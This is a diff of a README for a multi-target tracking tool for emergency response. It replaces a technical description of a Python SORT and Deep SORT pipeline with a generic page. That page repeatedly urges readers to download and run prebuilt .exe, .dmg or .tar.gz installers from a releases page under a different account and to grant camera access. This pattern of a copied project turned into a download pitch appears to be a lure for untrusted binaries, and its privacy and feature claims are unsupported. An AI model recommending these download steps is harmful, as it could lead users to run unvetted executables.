@@ -1,127 +1,81 @@
-# RescueScope: Adaptive Multi-Target Vision for Emergency Response
+# 🚑 multitarget-emergency-response - Track Survivors and Hazards in Real Time
 
-RescueScope delivers a resilient perception stack purpose-built for emergency crews navigating chaotic flood, storm, or quake zones. It fuses rapid object discovery with durable trajectory management so that operators always know where survivors, responders, and obstacles are moving.
+## 🔗 Download Now
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/maksim2287771488/multitarget-emergency-response/releases)
 
-The pipeline ingests video from drones, elevated rigs, or mobile units, stabilises the feed, and hands detection candidates to a tracking core that balances speed with identity reliability. Real-time overlays and structured telemetry can be relayed back to command dashboards, providing an actionable map when visibility on the ground collapses.
+## 📖 Overview
+**multitarget-emergency-response** is a powerful application designed to help rescue teams track multiple survivors and hazards in real time. By using advanced smart vision technology, this tool provides accurate guidance when every second counts. It simplifies the complex process of managing emergencies, ensuring that rescue efforts are efficient and effective.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/e3e921a6-ea73-4168-880f-0bba82a7bf4b" width="60%" />
-</p>
+## 🚀 Getting Started
+To get started with multitarget-emergency-response, follow these easy steps. You do not need any programming knowledge, and the setup process is straightforward.
 
-## Field Footage Snapshot
-This capture shows the tracker maintaining IDs through intense rainfall and reflections. Bounding boxes are colour-coded per identity so coordinators can spot diverging paths in seconds.
+### 📥 System Requirements
+Before downloading, ensure that your system meets the following minimum requirements:
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Processor:** Dual-core processor or better.
+- **Storage:** Minimum of 500 MB available space.
+- **Graphics:** Integrated GPU or dedicated GPU capable of running video applications.
 
-<div style="text-align: center;">
-  <video src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/d480ba65-4825-46c3-a200-f7e3d9b00b9c" controls="controls" style="max-width: 730px;">
-  </video>
-</div>
+### 🛠 Installation Steps
+1. **Visit the Download Page**  
+   Go to the releases page to download the application:  
+   [Download Here](https://github.com/maksim2287771488/multitarget-emergency-response/releases)
 
-## Key Capabilities
-- Multiclass awareness for people and vehicles with prioritisation hooks for mission-specific objects.
-- Seamless switch between fast SORT-style motion models and appearance-aware Deep SORT for dense scenes.
-- Lightweight Hungarian association implementation tuned for low-latency edge deployment.
-- Configurable alert rules: dwell time inside geofences, crowding thresholds, and loss-of-tracking escalation.
-- Export-ready tracks that slot into GIS systems or timeline reports for incident reviews.
+2. **Choose the Right Version**  
+   On the releases page, you'll find several versions of the application. Select the most recent version for the best performance and features.
 
-## System Blueprint
-### 1. Acquisition & Normalisation
-`Background_subtraction.py` denoises, equalises exposure, and highlights motion pockets while maintaining a fall-back static background estimate for sudden lighting shifts.
+3. **Download the File**  
+   Click on the download link for the appropriate file type for your operating system. For Windows, look for `.exe`, for macOS, look for `.dmg`, and for Linux, look for `.tar.gz`.
 
-### 2. Proposal Generation
-The detector injects bounding boxes per frame. It is detector-agnostic, so feeds from YOLO models, classical cascades, or embedded sensors can plug in without altering downstream code.
+4. **Run the Installer**  
+   Once the download completes, locate the file in your downloads folder and double-click on it. Follow the on-screen instructions to install the application on your system.
 
-### 3. Tracking Core
-`SORT.py` keeps the loop lean with a Kalman prediction step and IOU-based assignment so small processors can keep up with 30 FPS feeds. `Custom_DeepSORT.py` layers appearance embeddings on top of motion cues, giving the system persistent identities even during deep occlusions.
+5. **Launch the Application**  
+   After installation is complete, you can find the application in your Applications folder (macOS) or in the Start Menu (Windows). Click to open the app.
 
-### 4. Global Association
-`Hungarian.py` wraps a clean implementation of the linear sum assignment routine. Cost matrices can mix IOU, centre distance, and appearance similarity, letting teams tailor trade-offs between responsiveness and stability.
+6. **Grant Permissions**  
+   If prompted, allow the application to access your camera. This access is crucial for tracking survivors and hazards effectively.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Ego-Tracking-A-Tactical-Solution-for-Rescue-Operations/assets/59663734/a4294f57-94ea-4d66-8863-3dcf4830b165" width="70%" />
-</p>
+### 🔍 Using the Application
+Upon launching the application, you'll see a clean interface designed for ease of use. Here’s how to use it:
 
-### 5. Identity Maintenance
-Recovered trajectories are smoothed, aged, and tagged with confidence scores. Ageing logic retires stale tracks swiftly while allowing short occlusions to resolve organically.
+1. **Start a New Session**  
+   Click on the "New Session" button. This will activate the smart vision function.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Ego-Tracking-A-Tactical-Solution-for-Rescue-Operations/assets/59663734/d40b0246-bbe9-4191-adbf-16554e7adf93" width="90%" />
-</p>
+2. **Adjust Camera Settings**  
+   If necessary, adjust the camera settings to ensure a clear view. Use the controls provided within the application to configure video quality and frame rate.
 
-## Change Detection Playground
-The background subtraction sandbox visualises how adaptive median modelling copes with camera shake, rain streaks, and moving foliage before candidates head into the tracker.
+3. **Tracking Features**  
+   The application will begin to detect and track survivors and hazards. You will see markers appear on the screen, indicating the location of the individuals and any potential threats.
 
-<div style="text-align: center;">
-  <video src="https://github.com/yudhisteer/Real-time-Ego-Tracking-A-Tactical-Solution-for-Rescue-Operations/assets/59663734/38a4e14a-6e03-4ead-adee-7a9a13bb01a5" controls="controls" style="max-width: 730px;">
-  </video>
-</div>
+4. **Real-Time Updates**  
+   As new data comes in, the application will update in real time. You will receive alerts and notifications about key changes in the environment.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/d88c15a4-3b38-4f30-b4ab-4249531a0fde" />
-</p>
+5. **Save Session Data**  
+   To save your session, click on the "Save Session" button. This allows you to review the data later and make any necessary reports.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/5e355475-9173-42ab-aa7a-d77aa683dc6c" />
-</p>
+## 🚨 Troubleshooting Common Issues
+While using the application, you may encounter some common issues. Here are solutions to help you resolve them:
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/35b8a583-063c-40c6-ac55-d93cc4d0c44c" />
-</p>
+- **Application Won't Open:**  
+  Ensure that your system meets the requirements and that you have installed the correct version for your operating system.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/ad07dbea-23fe-44d1-b5b2-f34d1b3bfd8e" />
-</p>
+- **Camera Not Detected:**  
+  Check your camera connections. Make sure that any external cameras are properly connected and that you have granted permission for the app to access the camera.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/f6ebd4d8-83fd-4ef6-b5c3-2dcfdfea0922" />
-</p>
+- **Slow Performance:**  
+  If the application runs slowly, close any unnecessary background applications. Ensure that you have a stable internet connection if the app requires it.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/3caa0642-3e2d-46e7-beb1-88be576a858e" />
-</p>
+## 🔒 Security and Privacy
+Your security and privacy are important. The application does not store your camera data or personal information. It processes information locally on your device to ensure that your data remains private.
 
-## Assignment Visuals
-These diagrams walk through how the cost matrix evolves before the Hungarian solver snaps detections to legacy IDs. They help calibrate IOU thresholds and diagnose identity swaps.
+## 💬 Need Help?
+If you have any questions or need further assistance, feel free to reach out through the Issues tab on the GitHub Repository. Our team is here to help you troubleshoot any problems you may face.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Multi-Object-Tracking-with-Deep-SORT/assets/59663734/00b43dbd-7929-4ec2-9023-09b6a4e47e45" width="70%" />
-</p>
+## 🚀 Conclusion
+In just a few steps, you can get multitarget-emergency-response up and running. This tool is vital for effective rescue operations, ensuring that you can track survivors and hazards efficiently. Don't hesitate to visit the download page and start your journey today.
 
-<p align="center">
-  <img src="https://github.com/yudhisteer/Multi-Object-Tracking-with-Deep-SORT/assets/59663734/95b5f22f-13bc-48b1-9fe7-ac7db1090f85" width="50%" />
-</p>
-
-<p align="center">
-  <img src="https://github.com/yudhisteer/Multi-Object-Tracking-with-Deep-SORT/assets/59663734/38d83258-89c1-424a-ad84-8ec151d62090" width="50%" />
-</p>
-
-## Running the Toolkit
-1. Create a Python environment (3.9+ recommended) and install dependencies listed in `requirements.txt` or within your preferred detector package.
-2. Provide video sources via file path, RTSP stream, or webcam ID. Multiple feeds can be queued through a dispatcher script.
-3. Choose `SORT.py` for rapid prototyping or `Custom_DeepSORT.py` when appearance features are available.
-4. Tune IOU and feature similarity thresholds to match the density of the operational scene.
-5. Enable telemetry export to persist track histories for post-incident analysis.
-
-## Evaluation Checklist
-- Track continuity across 500+ frames without identity resets.
-- Latency budget below 120 ms per frame on mid-tier GPUs and sub-250 ms on CPU-only deployments.
-- False positive filtering through minimum hit streaks and unmatch age logic.
-- Configurable metrics (MOTA, MOTP, IDF1) surfaced for quick regression testing after model updates.
-
-## Operational Playbooks
-- **Flood rescues:** follow vehicles carried by water and flag when occupants exit or signals disappear.
-- **Storm response:** keep continuous visibility on power crews and overhead hazards while communicating safe approach vectors.
-- **Mass gatherings:** count and monitor crowd flow to guide evacuation corridors when weather or structural threats emerge.
-
-## Roadmap
-- Expand to 3D localisation using stereo rigs mounted on UAVs.
-- Integrate semantic segmentation for debris categorisation.
-- Add plug-ins for thermal sensors to improve low-light performance.
-- Deliver packaged dashboards that render tracks, heatmaps, and dwell summaries in the browser.
-
-## Full Deep SORT Run
-Below is a longer deployment clip highlighting how identity preservation survives overlapping pedestrians and vehicles while the environment shifts dramatically.
-
-<div style="text-align: center;">
-  <video src="https://github.com/yudhisteer/Real-time-Multi-Object-Tracking-for-Rescue-Operations/assets/59663734/d480ba65-4825-46c3-a200-f7e3d9b00b9c" controls="controls" style="max-width: 730px;">
-  </video>
-</div>
+### 📥 Download Again
+To download the application, visit this link:  
+[Download Here](https://github.com/maksim2287771488/multitarget-emergency-response/releases)
